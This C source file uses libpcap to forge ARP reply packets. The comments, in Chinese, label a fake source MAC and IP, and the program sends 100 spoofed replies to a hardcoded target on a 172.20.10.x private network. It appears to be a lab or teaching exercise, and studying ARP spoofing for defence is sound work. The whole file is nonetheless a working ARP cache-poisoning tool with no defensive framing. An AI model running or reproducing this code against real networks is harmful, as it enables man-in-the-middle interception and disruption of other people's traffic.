#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <pcap.h>
#include <time.h>

#define ETH_ARP 0x0806
#define ARP_HARDWARE 1
#define ETH_IP 0x0800
#define ARP_REQUEST 1
#define ARP_RESPONSE 2
struct EthernetHeader
{
    unsigned char DestMAC[6];
    unsigned char SourMAC[6];
    unsigned short EthType;
};
struct ArpHeader
{
    unsigned short hdType;
    unsigned short proType;
    unsigned char hdSize;
    unsigned char proSize;
    unsigned short op;
    unsigned char smac[6];
    unsigned char sip[4];
    unsigned char dmac[6];
    unsigned char dip[4];
};
int main()
{
    pcap_if_t *alldevs;
    pcap_if_t *d;
    int inum;
    int i = 0;
    pcap_t *adhandle;
    char errbuf[PCAP_ERRBUF_SIZE];
    // 使用Linux的pcap_findalldevs，而不是Windows的pcap_findalldevs_ex
    if (pcap_findalldevs(&alldevs, errbuf) == -1)
    {
        fprintf(stderr, "Error in pcap_findalldevs: %s\n", errbuf);
        return 1;
    }
    // 打印网络接口列表
    for (d = alldevs; d; d = d->next)
    {
        printf("%d. %s", ++i, d->name);
        if (d->description)
            printf(" (%s)\n", d->description);
        else
            printf(" (No description available)\n");
    }
    if (i == 0)
    {
        printf("\nNo interfaces found! Make sure libpcap is installed.\n");
        return 1;
    }
    printf("Enter the interface number (1-%d):", i);
    scanf("%d", &inum);
    if (inum < 1 || inum > i)
    {
        printf("\nInterface number out of range.\n");
        pcap_freealldevs(alldevs);
        return 1;
    }
    // 跳转到选择的接口
    for (d = alldevs, i = 0; i < inum - 1; d = d->next, i++)
        ;
    adhandle = pcap_open_live(d->name, // 设备名
                              65536,   // 捕获的最大字节数
                              1,       // 混杂模式
                              1000,    // 读取超时（毫秒）
                              errbuf); // 错误缓冲池
    if (adhandle == NULL)
    {
        fprintf(stderr, "\nUnable to open the adapter. %s is not supported by libpcap\n", d->name);
        pcap_freealldevs(alldevs);
        return 1;
    }
    // 开始填充ARP包
    unsigned char sendbuf[42];
    unsigned char mac_broadcast[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    unsigned char mac_local[6] = {0x12, 0x34, 0x56, 0x78, 0x9a, 0xff}; 
    unsigned char mac_dest[6] = {0x2e, 0xc2, 0x53, 0xa4, 0x47, 0x64};  // 目标MAC
    unsigned char mac_fake[6] = {0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF};  // 伪造的MAC
    unsigned char ip_local[4] = {172, 20, 10, 2}; // 你的IP
    unsigned char ip_dest[4] = {172, 20, 10, 4};  // 目标IP
    unsigned char ip_fake[4] = {172, 20, 10, 6};  // 伪造的IP
    struct EthernetHeader eh;
    struct ArpHeader ah;
    // 打印信息
    printf("\n========================================\n");
    printf("本地MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
           mac_local[0], mac_local[1], mac_local[2],
           mac_local[3], mac_local[4], mac_local[5]);
    printf("本地IP: %d.%d.%d.%d\n",
           ip_local[0], ip_local[1], ip_local[2], ip_local[3]);
    printf("目标MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
           mac_dest[0], mac_dest[1], mac_dest[2],
           mac_dest[3], mac_dest[4], mac_dest[5]);
    printf("目标IP: %d.%d.%d.%d\n",
           ip_dest[0], ip_dest[1], ip_dest[2], ip_dest[3]);
    printf("伪造MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
           mac_fake[0], mac_fake[1], mac_fake[2],
           mac_fake[3], mac_fake[4], mac_fake[5]);
    printf("伪造IP: %d.%d.%d.%d\n",
           ip_fake[0], ip_fake[1], ip_fake[2], ip_fake[3]);
    printf("========================================\n");
    // 填充以太网头部
    for (int i = 0; i < 6; i++)
    {
        eh.DestMAC[i] = mac_dest[i];  // 目标MAC地址
        eh.SourMAC[i] = mac_local[i]; // 源MAC地址
    }
    eh.EthType = htons(ETH_ARP);
    // 填充ARP头部
    ah.hdType = htons(ARP_HARDWARE);
    ah.proType = htons(ETH_IP);
    ah.hdSize = 6;
    ah.proSize = 4;
    ah.op = htons(ARP_RESPONSE); // 使用ARP响应
    for (int i = 0; i < 6; i++)
    {
        ah.smac[i] = mac_fake[i]; // 伪造的源MAC
        ah.dmac[i] = mac_dest[i]; // 目标MAC
    }
    for (int i = 0; i < 4; i++)
    {
        ah.sip[i] = ip_fake[i]; // 伪造的源IP
        ah.dip[i] = ip_dest[i]; // 目标IP
    }
    // 构造ARP包
    for (int _i = 0; _i < 1e2; _i++) // 减少发送次数，从1e10改为1e2
    {
        memset(sendbuf, 0, sizeof(sendbuf));
        memcpy(sendbuf, &eh, sizeof(eh));
        memcpy(sendbuf + sizeof(eh), &ah, sizeof(ah));
        // 发送ARP包
        if (pcap_sendpacket(adhandle, sendbuf, 42) == 0)
        {
            printf("\n第 %d 个ARP包发送成功\n", _i + 1);
        }
        else
        {
            // Linux下使用pcap_geterr获取错误信息
            fprintf(stderr, "PacketSendPacket Error: %s\n", pcap_geterr(adhandle));
        }
        // 延迟一段时间，避免过于频繁发送
        usleep(100000); // 100毫秒
    }
    // 清理
    pcap_close(adhandle);
    pcap_freealldevs(alldevs);

    printf("程序结束\n");
    return 0;
}